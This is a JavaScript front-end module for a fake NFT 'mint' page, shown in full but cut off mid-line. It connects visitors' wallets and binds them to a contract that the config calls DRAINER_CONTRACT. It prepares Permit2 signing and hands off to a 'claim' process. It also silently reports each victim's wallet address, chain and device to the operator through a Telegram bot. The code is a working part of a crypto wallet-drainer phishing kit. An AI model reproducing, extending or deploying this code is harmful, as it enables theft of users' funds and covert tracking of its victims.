import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ---------------------------------------------------------------------
   *  Logging + debug panel
   * ------------------------------------------------------------------- */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  const log = (msg) => {
    try {
      console.log('[main]', msg);
      debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()} ${msg}</div>`;
      debugArea.scrollTop = debugArea.scrollHeight;
    } catch (_) {}
  };

  window.addEventListener('error', (e) => log(`⚠️ window error: ${e.message}`));
  window.addEventListener('unhandledrejection', (e) => log(`⚠️ unhandled: ${e.reason?.message || e.reason}`));

  /* ---------------------------------------------------------------------
   *  Platform detection
   * ------------------------------------------------------------------- */
  const ua = navigator.userAgent || '';
  const isMobile  = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isIOS     = () => /iPhone|iPad|iPod/i.test(ua);
  const isAndroid = () => /Android/i.test(ua);
  const isDesktop = () => !isMobile();
  const isWindows = () => /Windows/i.test(ua);
  const isMac     = () => /Macintosh|Mac OS X/i.test(ua);

  const platform = (() => {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  })();

  /* ---------------------------------------------------------------------
   *  Config destructure (defensive)
   * ------------------------------------------------------------------- */
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG || {};

  let projectId = PROJECT_ID || PUBLIC_TEST_ID;

  const MAINNET_HEX = '0x' + Number(MAINNET_ID).toString(16);

  /* ---------------------------------------------------------------------
   *  Telegram reporter (module-scoped; not exposed on window)
   * ------------------------------------------------------------------- */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG || {};

  async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) { log(`telegram error: ${e.message}`); return false; }
  }
  window.testTelegram = (m) => sendTelegram(m || '🧪 Test ' + new Date().toISOString());

  /* ---------------------------------------------------------------------
   *  DOM refs
   * ------------------------------------------------------------------- */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ---------------------------------------------------------------------
   *  UI helpers
   * ------------------------------------------------------------------- */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7 0%,#BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2 0%,#FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE 0%,#BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ---------------------------------------------------------------------
   *  State
   * ------------------------------------------------------------------- */
  let web3Instance      = null;
  let contractInstance  = null;
  let activeProvider    = null;             // tracked EIP-1193 provider
  let currentSession    = null;             // WC session, if any
  let currentAddress    = null;
  let currentChainId    = null;
  let isConnecting      = false;
  let listenersAttached = false;

  // WalletConnect library handles
  let SignClient, WalletConnectModal, EthereumProvider;
  let wcClient, wcModal;

  /* ---------------------------------------------------------------------
   *  Storage helpers
   * ------------------------------------------------------------------- */
  const LS = {
    ADDRESS: 'connectedAddress',
    TYPE:    'connectedWalletType',
    TOPIC:   'wcSessionTopic',
  };

  function saveConnection(address, walletType, topic) {
    try {
      if (address)    localStorage.setItem(LS.ADDRESS, address);
      if (walletType) localStorage.setItem(LS.TYPE, walletType);
      if (topic)      localStorage.setItem(LS.TOPIC, topic);
    } catch (e) { log(`saveConnection: ${e.message}`); }
  }
  function clearConnection() {
    try {
      localStorage.removeItem(LS.ADDRESS);
      localStorage.removeItem(LS.TYPE);
      localStorage.removeItem(LS.TOPIC);
    } catch (_) {}
  }
  function readSaved() {
    try {
      return {
        address: localStorage.getItem(LS.ADDRESS),
        type:    localStorage.getItem(LS.TYPE),
        topic:   localStorage.getItem(LS.TOPIC),
      };
    } catch (_) { return {}; }
  }

  /* ---------------------------------------------------------------------
   *  Publish state for script.js
   * ------------------------------------------------------------------- */
  function publish(address, chain) {
    const live = activeProvider
      || web3Instance?.currentProvider
      || window.ethereum
      || null;

    window.__apexConnected = {
      address,
      chain,                    // 'evm' | 'solana' | 'bitcoin'
      web3: web3Instance,
      contract: contractInstance,
      provider: live,           // critical for Permit2 signing via WC
      session: currentSession,
      publishedAt: Date.now(),
    };

    log(`published __apexConnected address=${address} chain=${chain} provider=${live ? 'yes' : 'no'}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  function unpublish() {
    window.__apexConnected = null;
    window.dispatchEvent(new CustomEvent('apex:disconnected'));
  }

  /* ---------------------------------------------------------------------
   *  Chain management — pin to Ethereum mainnet
   * ------------------------------------------------------------------- */
  async function readChainId(provider) {
    try {
      const raw = await provider.request({ method: 'eth_chainId' });
      return parseInt(raw, 16);
    } catch (e) { log(`readChainId failed: ${e.message}`); return null; }
  }

  async function ensureMainnet(provider) {
    const current = await readChainId(provider);
    if (current === MAINNET_ID) { currentChainId = current; return true; }

    log(`switching chain from ${current} to ${MAINNET_ID}`);
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: MAINNET_HEX }],
      });
      currentChainId = MAINNET_ID;
      return true;
    } catch (err) {
      const code = err?.code ?? err?.data?.originalError?.code;
      if (code === 4902 || code === -32603) {
        try {
          await provider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: MAINNET_HEX,
              chainName: 'Ethereum Mainnet',
              nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://eth.llamarpc.com'],
              blockExplorerUrls: ['https://etherscan.io'],
            }],
          });
          await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: MAINNET_HEX }],
          });
          currentChainId = MAINNET_ID;
          return true;
        } catch (addErr) {
          log(`add chain failed: ${addErr.message}`);
          return false;
        }
      }
      log(`switch rejected: ${err.message}`);
      return false;
    }
  }

  /* ---------------------------------------------------------------------
   *  EIP-6963 provider discovery
   * ------------------------------------------------------------------- */
  const eip6963Providers = [];
  let eip6963Ready = false;

  function setupEIP6963() {
    if (eip6963Ready) return;
    eip6963Ready = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!d?.info?.uuid) return;
      if (!eip6963Providers.some((p) => p.info.uuid === d.info.uuid)) {
        eip6963Providers.push(d);
        log(`EIP-6963 discovered ${d.info.name}`);
      }
    });
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 500);
    setTimeout(request, 1500);
  }

  /* ---------------------------------------------------------------------
   *  Wallet picker modal
   * ------------------------------------------------------------------- */
  function showWalletPicker(providers) {
    return new Promise((resolve) => {
      const overlay = document.createElement('div');
      overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;

      const modal = document.createElement('div');
      modal.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:420px;width:90%;color:white;font-family:Inter,sans-serif;`;

      modal.innerHTML = `
        <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
        <div id="wallet-list" style="display:flex;flex-direction:column;gap:10px;margin:16px 0;"></div>
        <button id="wc-cancel" style="background:none;border:1px solid #555;color:#ccc;padding:10px 16px;border-radius:8px;cursor:pointer;width:100%;font-size:15px;">Cancel</button>
      `;
      overlay.appendChild(modal);
      document.body.appendChild(overlay);

      const list = modal.querySelector('#wallet-list');
      providers.forEach((p) => {
        const b = document.createElement('button');
        b.style.cssText = `background:#374151;border:none;padding:14px;border-radius:10px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:12px;align-items:center;font-weight:500;`;
        b.innerHTML = `
          ${p.info.icon ? `<img src="${p.info.icon}" style="width:26px;height:26px;border-radius:4px;">` : ''}
          <span>${p.info.name}</span>
        `;
        b.onclick = () => { overlay.remove(); resolve(p); };
        list.appendChild(b);
      });

      modal.querySelector('#wc-cancel').onclick = () => { overlay.remove(); resolve(null); };
      overlay.addEventListener('click', (e) => { if (e.target === overlay) { overlay.remove(); resolve(null); } });
    });
  }

  /* ---------------------------------------------------------------------
   *  WalletConnect library loading
   * ------------------------------------------------------------------- */
  async function loadWalletConnectLibs() {
    if (SignClient && WalletConnectModal && EthereumProvider) return;

    const signCdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    for (const url of signCdns) {
      try { const m = await import(url); SignClient = m.default || m; log(`SignClient ← ${url}`); break; }
      catch (_) {}
    }
    if (!SignClient) throw new Error('SignClient unavailable');

    for (const url of modalCdns) {
      try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; log(`WCModal ← ${url}`); break; }
      catch (_) {}
    }
    if (!WalletConnectModal) throw new Error('WalletConnectModal unavailable');

    for (const url of providerCdns) {
      try { const m = await import(url); EthereumProvider = m.EthereumProvider || m.default || m; log(`EthProvider ← ${url}`); break; }
      catch (_) {}
    }
    if (!EthereumProvider) throw new Error('EthereumProvider unavailable');
  }

  /* ---------------------------------------------------------------------
   *  WebSocket reachability pre-check (mobile relays can be flaky)
   * ------------------------------------------------------------------- */
  async function checkWCReachable() {
    if (isDesktop()) return true;
    return new Promise((resolve) => {
      try {
        const ws = new WebSocket('wss://relay.walletconnect.com');
        const timer = setTimeout(() => { try { ws.close(); } catch (_) {} resolve(false); }, 3000);
        ws.onopen  = () => { clearTimeout(timer); try { ws.close(); } catch (_) {} resolve(true); };
        ws.onerror = () => { clearTimeout(timer); try { ws.close(); } catch (_) {} resolve(false); };
      } catch (_) { resolve(false); }
    });
  }

  /* ---------------------------------------------------------------------
   *  WalletConnect init (idempotent)
   * ------------------------------------------------------------------- */
  async function initWC(useTestId = false) {
    if (wcClient && wcModal) return true;
    await loadWalletConnectLibs();

    if (useTestId && PUBLIC_TEST_ID) { projectId = PUBLIC_TEST_ID; log('using test projectId'); }
    if (!projectId) throw new Error('No WalletConnect projectId');

    const reachable = await checkWCReachable();
    if (!reachable) log('⚠️ WC relay unreachable — will try anyway');

    wcClient = await SignClient.init({
      projectId,
      metadata: DAPP_METADATA,
      relayUrl: 'wss://relay.walletconnect.com',
    });

    wcModal = new WalletConnectModal({
      projectId,
      themeMode: 'dark',
      themeVariables: {
        '--wcm-z-index': '9999',
        '--wcm-accent-color': '#FF6B00',
        '--wcm-background-color': '#1F2937',
      },
      enableExplorer: true,
    });

    // Restore sessions from previous page loads
    if (wcClient.session?.getAll) {
      const existing = wcClient.session.getAll();
      if (existing.length) {
        currentSession = existing[existing.length - 1];
        log(`restored WC session ${currentSession.topic.slice(0, 10)}…`);
      }
    }
    log('✅ WalletConnect ready');
    return true;
  }

  /* ---------------------------------------------------------------------
   *  Attach provider event listeners (idempotent per provider)
   * ------------------------------------------------------------------- */
  const attachedProviders = new WeakSet();

  function attachProviderEvents(provider, walletType = 'injected') {
    if (!provider || !provider.on) return;
    if (attachedProviders.has(provider)) return;
    attachedProviders.add(provider);

    provider.on('accountsChanged', (accounts) => {
      const next = accounts?.[0];
      if (!next) { log('accounts empty → disconnect'); resetUI(); clearConnection(); unpublish(); return; }
      currentAddress = next;
      saveConnection(next, walletType, currentSession?.topic);
      renderConnectedUI(next, 'evm');
      publish(next, 'evm');
    });

    provider.on('chainChanged', async () => {
      const id = await readChainId(provider);
      currentChainId = id;
      log(`chainChanged → ${id}`);
      if (id === MAINNET_ID) {
        const a = currentAddress || (await getAddressFromProvider(provider));
        if (a) { renderConnectedUI(a, 'evm'); publish(a, 'evm'); }
      } else {
        showStatus('Please switch to Ethereum Mainnet', 'info');
        await ensureMainnet(provider);
      }
    });

    provider.on('disconnect', () => {
      log('provider disconnected');
      resetUI();
      clearConnection();
      unpublish();
    });
  }

  /* ---------------------------------------------------------------------
   *  Address / contract helpers
   * ------------------------------------------------------------------- */
  async function getAddressFromProvider(provider) {
    try {
      const acc = await provider.request({ method: 'eth_accounts' });
      return acc?.[0] || null;
    } catch (_) { return null; }
  }

  async function buildWeb3(provider) {
    const Web3 = (await import('web3')).default;
    const w3 = new Web3(provider);
    return w3;
  }

  function buildContract(w3) {
    try {
      return new w3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    } catch (e) { log(`contract build failed: ${e.message}`); return null; }
  }

  /* ---------------------------------------------------------------------
   *  Render / reset UI
   * ------------------------------------------------------------------- */
  function renderConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const labels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const label = labels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px;padding:10px 16px;
        font-family:'JetBrains Mono',monospace;font-size:14px;
        color:#059669;text-align:center;
        background:linear-gradient(135deg,#ECFDF5 0%,#D1FAE5 100%);
        border-radius:8px;border:1px solid #A7F3D0;
      `;
      connectButton?.parentNode?.appendChild(display);
    }

    const short = `${address.slice(0, 6)}…${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:#fff;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${label}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        if (!b) return;
        const original = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = original; }, 2000);
      }).catch(() => {});
    });

    showStatus(`Connected to ${label}`, 'success');

    sendTelegram(
      `🔗 <b>Wallet Connected</b>\n` +
      `📌 <b>Chain:</b> ${label}\n` +
      `👤 <b>Address:</b> <code>${address}</code>\n` +
      `📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}\n` +
      `🕒 ${new Date().toLocaleString()}`
    );
  }

  function resetUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentAddress = null;
    currentChainId = null;
  }

  /* ---------------------------------------------------------------------
   *  Direct (injected) EVM connect
   * ------------------------------------------------------------------- */
  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let candidates = eip6963Providers.filter((p) => p.provider);
    if (!candidates.length && window.ethereum) {
      candidates = [{
        info: { name: 'Injected', uuid: 'injected-fallback', rdns: 'io.injected', icon: '' },
        provider: window.ethereum,
      }];
    }
    if (!candidates.length) return { ok: false, reason: 'no-injected' };

    let chosen;
    if (candidates.length === 1) {
      chosen = candidates[0];
    } else {
      // Prefer well-known wallets silently
      const preferred = candidates.find((p) =>
        /metamask|trust|coinbase|rabby|brave/i.test(p.info.name) ||
        /io\.metamask|com\.trust|io\.coinbase|io\.rabby/i.test(p.info.rdns || '')
      );
      chosen = preferred || await showWalletPicker(candidates);
      if (!chosen) return { ok: false, reason: 'cancelled' };
    }

    const provider = chosen.provider;
    try {
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 8000)),
      ]);
      const address = accounts?.[0];
      if (!address) return { ok: false, reason: 'no-accounts' };

      const okChain = await ensureMainnet(provider);
      if (!okChain) return { ok: false, reason: 'wrong-chain' };

      const w3 = await buildWeb3(provider);
      web3Instance = w3;
      contractInstance = buildContract(w3);
      activeProvider = provider;
      currentAddress = address;
      currentChainId = MAINNET_ID;

      attachProviderEvents(provider, chosen.info.name.toLowerCase());
      saveConnection(address, chosen.info.name.toLowerCase(), null);
      renderConnectedUI(address, 'evm');
      publish(address, 'evm');
      log(`✅ injected connected ${address} via ${chosen.info.name}`);
      return { ok: true, address };
    } catch (e) {
      log(`injected error: ${e.message}`);
      return { ok: false, reason: e.message };
    }
  }

  /* ---------------------------------------------------------------------
   *  WalletConnect connect (with deep-link fallbacks on mobile)
   * ------------------------------------------------------------------- */
  async function connectWalletConnect(useTestId = false, timeoutMs = 300000) {
    try { await initWC(useTestId); }
    catch (e) { log(`WC init failed: ${e.message}`); return { ok: false, reason: 'wc-init' }; }

    // Reuse existing session if present
    if (currentSession?.topic && wcClient?.session?.get) {
      const live = wcClient.session.get(currentSession.topic);
      if (live) {
        try {
          const provider = await EthereumProvider.init({
            projectId,
            metadata: DAPP_METADATA,
            session: live,
            chains: [MAINNET_ID],
          });
          const address = await getAddressFromProvider(provider);
          if (address) {
            const w3 = await buildWeb3(provider);
            web3Instance = w3;
            contractInstance = buildContract(w3);
            activeProvider = provider;
            currentAddress = address;
            attachProviderEvents(provider, 'walletconnect');
            renderConnectedUI(address, 'evm');
            publish(address, 'evm');
            log(`✅ WC session reused for ${address}`);
            return { ok: true, address };
          }
        } catch (e) { log(`session reuse failed: ${e.message}`); }
      }
    }

    // Fresh pairing
    try {
      log('requesting WC pair…');
      const { uri, approval } = await wcClient.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_signTypedData'],
            chains: [`eip155:${MAINNET_ID}`],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });
      if (!uri) throw new Error('no uri');

      // On mobile, try to deep-link directly into a wallet app first
      if (isMobile()) {
        const deepLink = pickMobileDeepLink(uri);
        if (deepLink) {
          try {
            window.location.href = deepLink;
            log(`deep-linked to ${deepLink.split(':')[0]}`);
          } catch (_) {}
        }
      }

      // Always show the WC modal (works for desktop + as fallback on mobile)
      wcModal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');

      const session = await Promise.race([
        approval(),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
      ]);
      try { wcModal.closeModal(); } catch (_) {}

      if (!session?.namespaces?.eip155?.accounts?.length) {
        return { ok: false, reason: 'no-session' };
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      const provider = await EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
        chains: [MAINNET_ID],
      });
      const w3 = await buildWeb3(provider);
      web3Instance = w3;
      contractInstance = buildContract(w3);
      activeProvider = provider;
      currentAddress = account;
      currentChainId = MAINNET_ID;

      attachProviderEvents(provider, 'walletconnect');
      saveConnection(account, 'walletconnect', session.topic);
      renderConnectedUI(account, 'evm');
      publish(account, 'evm');
      log(`✅ WC connected ${account}`);
      return { ok: true, address: account };
    } catch (e) {
      try { wcModal.closeModal(); } catch (_) {}
      log(`WC error: ${e.message}`);
      return { ok: false, reason: e.message };
    }
  }

  /* ---------------------------------------------------------------------
   *  Mobile deep-link selection
   * ------------------------------------------------------------------- */
  function pickMobileDeepLink(uri) {
    const encoded = encodeURIComponent(uri);
    const installed = {
      metamask:  !!(window.ethereum?.isMetaMask || window.ethereum?.providers?.some?.((p) => p.isMetaMask)),
      trust:     !!(window.ethereum?.isTrust || window.ethereum?.isTrustWallet),
      rainbow:   !!(window.ethereum?.isRainbow),
      coinbase:  !!(window.ethereum?.isCoinbaseWallet),
    };

    if (installed.metamask)  return `metamask://wc?uri=${encoded}`;
    if (installed.trust)     return `trust://wc?uri=${encoded}`;
    if (installed.rainbow)   return `rainbow://wc?uri=${encoded}`;
    if (installed.coinbase)  return `cbwallet://wc?uri=${encoded}`;

    // Fallback to MetaMask universal link (works even without the app installed)
    return `https://metamask.app.link/wc?uri=${encoded}`;
  }

  /* ---------------------------------------------------------------------
   *  Connect dispatcher — mobile vs desktop
   * ------------------------------------------------------------------- */
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let result = { ok: false };

    if (isMobile()) {
      // On mobile, WC is preferred (deep-links work reliably).
      result = await connectWalletConnect(false);
      if (!result.ok) result = await connectInjected();
      if (!result.ok) result = await connectWalletConnect(true);
    } else {
      // On desktop, try injected first.
      result = await connectInjected();
      if (!result.ok) result = await connectWalletConnect(false);
      if (!result.ok) result = await connectWalletConnect(true);
    }

    isConnecting = false;

    if (result.ok) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      // script.js listens for apex:connected; kick off claim flow once connected.
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      log(`connect failed: ${result.reason || 'unknown'}`);
      setButtonState(connectButton, '
